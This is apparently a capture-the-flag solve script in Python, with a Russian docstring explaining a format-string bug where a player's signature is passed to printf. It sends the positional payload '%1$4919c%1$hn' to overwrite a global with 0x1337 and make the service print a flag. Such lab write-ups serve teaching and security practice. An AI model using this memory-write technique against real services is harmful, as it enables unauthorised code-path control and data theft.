#!/usr/bin/env python3
"""Эксплойт для «Дела о знаке четырёх»: format string в main.

Идея решения:
  1. Уязвимость — printf(signature, &expedition): подпись игрока становится
     строкой формата, а &expedition — единственным vararg-аргументом.
  2. Пейлоад позиционный (%1$...): аргумент №1 — всегда &expedition,
     поэтому раскладка стека и компилятор не влияют на адресацию.
  3. %1$4919c печатает ровно 4919 = 0x1337 символов (ширина поля).
  4. %1$hn записывает количество выведенного как unsigned short по
     аргументу №1 — прямо в глобальную expedition.
  5. Проверка expedition == 0x1337 проходит, вызывается keeper(): она читает
     /run/case/flag и печатает флаг в тот же сокет.

Подпись уходит целиком в printf(signature, &expedition), где
&expedition — единственный vararg. Пейлоад %1$4919c%1$hn печатает
4919 = 0x1337 символов и записывает это число как short по тому же
аргументу — в глобальную переменную expedition. После проверки
expedition == 0x1337 хранитель печатает флаг.

Запуск:  python3 solve.py [host] [port]   (по умолчанию 127.0.0.1 13427)
"""

import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 13427

with socket.create_connection((host, port), timeout=15) as sock:
    # дожидаемся приглашения: сервис печатает его до чтения подписи
    sock.recv(4096)
    # 4919 = 0x1337: ширина поля добивается пробелами, hn пишет «сколько
    # выведено» как short по первому аргументу — то есть в expedition
    sock.sendall(b"%1$4919c%1$hn\n")
    # закрываем свою сторону записи: сервис дочитывает вывод printf до EOF
    # и сам закрывает соединение после флага
    sock.shutdown(socket.SHUT_WR)
    # читаем до EOF: перед флагом едут 4919 пробелов ширины поля
    print(b"".join(iter(lambda: sock.recv(65536), b"")).decode(errors="replace"), end="")
